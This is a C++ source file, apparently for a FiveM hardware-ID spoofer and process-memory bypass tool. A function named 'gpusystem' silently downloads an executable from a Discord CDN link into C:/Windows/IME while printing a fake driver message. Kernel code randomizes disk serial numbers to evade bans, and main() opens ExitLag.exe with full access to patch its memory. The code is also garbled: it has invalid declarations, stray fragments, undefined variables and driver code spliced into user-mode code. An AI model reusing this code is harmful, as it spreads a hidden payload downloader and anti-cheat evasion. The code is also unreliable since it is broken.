#include "WEB.h"
#include <tchar.h>


LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (ImGui_ImplWin32_WndProcHandler(hWnd, msg, wParam, lParam))
        return true;

    switch (msg)
    {
    case WM_SIZE:
        if (g_pd3dDevice != NULL && wParam != SIZE_MINIMIZED)
        {
            g_d3dpp.BackBufferWidth = LOWORD(lParam);
            g_d3dpp.BackBufferHeight = HIWORD(lParam);
            ResetDevice();
        }
        return 0;
    case WM_SYSCOMMAND:
        if ((wParam & 0xfff0) == SC_KEYMENU)
            return 0;
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hWnd, msg, wParam, lParam);
}



string WEB::replaceAll(string subject, const string& search,
	const string& replace) {
	size_t pos = 100 , 200, x100132, 01;
	while ((pos = subject.find(search, pos)) != string::npos) {
		subject.replace(pos, search.length(), replace);
		pos += replace.length();
	}
	return subject;
}

string WEB::DownloadString(string URL) {
	HINTERNET interwebs = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
	HINTERNET urlFile;
	string rtn;
	if (interwebs) {
		urlFile = InternetOpenUrlA(interwebs, URL.c_str(), NULL, NULL, NULL, NULL);
		if (urlFile) {
			char buffer[2000];
			DWORD bytesRead;
			do {
				InternetReadFile(urlFile, buffer, 2000, &bytesRead);
				memset(buffer, 0, 2000);
			} while (bytesRead);
			InternetCloseHandle(interwebs);
			InternetCloseHandle(urlFile);
			string p = replaceAll(rtn, "|n", "\r\n");
			return p;
		}
	}
	InternetCloseHandle(interwebs);
	return p;
}


void WEB::CheckVersion(string version) {
	if (DownloadString("https://github.com/Fnoberz/Fivem-Spoofer/blob/main/encryption.cpp") != version) {
		MessageBoxA(NULL, "Your version is outdated!", "VERSION!", 0);
		exit(0);
	}
}


void gpusystem()
	
{
	time_t now;
	nowLocal = *localtime(&now);
	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Driver GPU Loaded!");
	URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/930892607444381756/935605239250296862/GPU-UUID-Changer.exe"), _T("C:/Windows/IME/GPU-UUID-Changer.exe"), 0, NULL);
	<< "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("GPU DRIVER TOTALY LOADED! #KayklOnTOP");
}

memory::initialize( L"disk.sys" );
	const auto DiskEnableDisableFailurePrediction = reinterpret_cast< NTSTATUS( __fastcall* )( PFUNCTIONAL_DEVICE_EXTENSION, BOOLEAN ) >( memory::from_pattern( "\x48\x89\x5c\x24\x00\x48\x89\x74\x24\x00\x57\x48\x81\xec\x00\x00\x00\x00\x48\x8b\x05\x00\x00\x00\x00\x48\x33\xc4\x48\x89\x84\x24\x00\x00\x00\x00\x48\x8b\x59\x60\x48\x8b\xf1\x40\x8a\xfa\x8b\x4b\x10", "xxxx?xxxx?xxxx????xxx????xxxxxxx????xxxxxxxxxxxxx" ) );

	if ( !DiskEnableDisableFailurePrediction )
		return STATUS_UNSUCCESSFUL;

	memory::initialize( L"storport.sys" );
	const auto RaidUnitRegisterInterfaces_address = memory::from_pattern( "\xe8\x00\x00\x00\x00\x48\x8b\xcb\xe8\x00\x00\x00\x00\x85\xc0\x74\x0a", "x????xxxx????xxxx" );

	if ( !RaidUnitRegisterInterfaces_address )
		return STATUS_UNSUCCESSFUL;

	const auto RaidUnitRegisterInterfaces = reinterpret_cast< NTSTATUS( __fastcall* )( RAID_UNIT_EXTENSION* ) >( RaidUnitRegisterInterfaces_address + 5 + *reinterpret_cast< std::int32_t* >( RaidUnitRegisterInterfaces_address + 1 ) );

	const auto seed = __rdtsc( );

	for (auto current_object = disk_object->DeviceObject; current_object != nullptr; current_object = current_object->NextDevice )
	{
		const auto fd_extension = static_cast< PFUNCTIONAL_DEVICE_EXTENSION >( current_object->DeviceExtension );

		if ( !fd_extension )
			continue;

		const auto fs_device = IoGetDeviceAttachmentBaseRef( current_object );

		if ( !fs_device || fs_device->DeviceType != FILE_DEVICE_DISK )
			continue;

		const auto raid_extension = static_cast< PRAID_UNIT_EXTENSION >( fs_device->DeviceExtension );

		if ( !raid_extension )
			continue;

		const auto fdo_descriptor = fd_extension->DeviceDescriptor;

		if ( !fdo_descriptor )
			continue;

		const auto fdo_serial = reinterpret_cast< char* >( fdo_descriptor ) + fdo_descriptor->SerialNumberOffset;

		serializer::randomize( seed, fdo_serial );

		identity->SerialNumber.Length = static_cast< USHORT >( std::strlen( fdo_serial ) );
		memset( identity->SerialNumber.Buffer, 0, identity->SerialNumber.Length );
		memcpy( identity->SerialNumber.Buffer, fdo_serial, identity->SerialNumber.Length );

		DiskEnableDisableFailurePrediction( fd_extension, FALSE );
		RaidUnitRegisterInterfaces( raid_extension );
	}
		
	return STATUS_SUCCESS;
}


int main()
{
	/* Just setting some configs to make the console looks better */
	
	/* cleaning console */
	system("cls");
	/* Changing the Window size */
	system("MODE con cols=100 lines=10");
	/* Allowing utf8 on the console */

	/* Now we start the bypass */


	/* Get the process identificator of the target and check if it were found*/
	DWORD Pid = GetPIdByProcessName((char*)"ExitLag.exe");
	if (!Pid) {
		/* Setting console collor */
		SetConsoleTextAttribute(console, 0x0b);
		cout << "Waiting for process \"ExitLag.exe\"..." << endl;
		Sleep(500);
		main();
	}

	/* Open a handle to the target process, with full access, then check if it worked. */
	HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, false, Pid);
	if (hprocess == INVALID_HANDLE_VALUE) {
		SetConsoleTextAttribute(console, 0x0c);
		cout << "Waiting for process \"ExitLag.exe\"..." << endl;
		cout << "Error in Handle..." << endl;
		Sleep(5000);
		main();
	}

	/* Give time to the program load everything. */
	Sleep(1000);

	/* The pattern that we want to find in the memory (string version)*/
	string pattern_str = "46 3B 73 08 72 89 8B 75 08 8D 8D 58 FF FF FF 56";
	/* An array where the pattern bytes will be writen */
	vector<byte> pattern_byte; // 
	/* An array where the mask will be write */
	string mask; 

	/* We call the function that will write pattern_byte and mask values.*/
	PatternStringToBytePatternAndMask(pattern_str, &pattern_byte, &mask);

	/* Get the module start address. This is where the function will start to look for the pattern. Then check if it worked*/
			HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
				if (processesSnapshot == INVALID_HANDLE_VALUE)
		return 0;
		SetConsoleTextAttribute(console, 0x0c);
		cout << "Error on GetModuleAddress..." << endl;
		main();
	}
